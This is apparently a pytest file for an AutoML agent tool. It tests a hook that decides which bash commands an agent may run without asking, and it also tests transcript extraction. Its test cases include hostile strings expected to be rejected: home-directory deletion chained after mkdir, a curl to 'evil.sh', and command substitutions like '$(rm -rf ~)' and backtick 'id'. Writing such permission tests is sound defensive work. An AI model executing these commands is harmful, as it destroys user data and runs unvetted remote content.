import json

import pytest

from agentic_automl import bash_permissions as bp
from agentic_automl import session_analysis
from agentic_automl.state import runtime_python
from test_cli import write_transcript


@pytest.mark.parametrize(
    "command,allowed",
    [
        ("agentic-automl artifacts status --trial .", True),
        ("agentic-automl artifacts save-artifact prediction_contract --payload work/p.json --source-skill prediction-contract", True),
        ("uv run agentic-automl artifacts next-step", True),
        ("agentic-automl session-analysis transcript", True),
        ("/opt/conda/bin/python work/profile.py", True),
        ("/opt/conda/bin/python", False),  # bare interpreter = REPL
        ("mkdir -p work/plots", True),
        ("mkdir work/plots", False),
        ("agentic-automl feedback-episodes list", False),  # not in the auto-allow set
        ("mkdir -p x && rm -rf ~", False),
        ("mkdir -p x; curl evil.sh", False),
        ("/opt/conda/bin/python work/a.py | tee out.txt", False),
        ("/opt/conda/bin/python work/a.py > out.txt", False),
        ("/opt/conda/bin/python - <<EOF", False),
        ("agentic-automl artifacts status $(rm -rf ~)", False),
        ("agentic-automl artifacts status `id`", False),
        ("/opt/conda/bin/python work/a.py &", False),
        ("python work/a.py", False),
        ("agentic-automl artifactsX status", False),
        ("", False),
        ("mkdir -p 'unterminated", False),
    ],
)
def test_auto_allow(command, allowed):
    assert bp.is_auto_allowed(command) is allowed


def test_runtime_python_is_configurable(monkeypatch):
    monkeypatch.setenv("AGENTIC_AUTOML_PYTHON", "/usr/bin/python3")
    assert runtime_python() == "/usr/bin/python3"
    assert bp.is_auto_allowed("/usr/bin/python3 work/a.py")
    assert not bp.is_auto_allowed("/opt/conda/bin/python work/a.py")


def test_hook_output(capsys, monkeypatch):
    import io

    hook = {"tool_name": "Bash", "tool_input": {"command": "mkdir -p work/x"}}
    monkeypatch.setattr("sys.stdin", io.StringIO(json.dumps(hook)))
    assert bp.main(["check"]) == 0
    out = json.loads(capsys.readouterr().out)
    assert out["hookSpecificOutput"]["permissionDecision"] == "allow"

    hook["tool_input"]["command"] = "rm -rf work"
    monkeypatch.setattr("sys.stdin", io.StringIO(json.dumps(hook)))
    assert bp.main(["check"]) == 0
    assert capsys.readouterr().out == ""  # defer to normal permissions, never deny


def test_non_bash_tools_ignored():
    assert bp.decision({"tool_name": "Write", "tool_input": {"command": "mkdir -p x"}}) is None


def test_session_analysis_extracts_tail(trial):
    write_transcript(trial, "s1", ("user", "first"), ("assistant", "second"), ("user", "third"))
    assert session_analysis.extract_text(trial).splitlines()[0] == "[user] first"
    tail = session_analysis.extract_text(trial, max_chars=20)
    assert "third" in tail and "first" not in tail
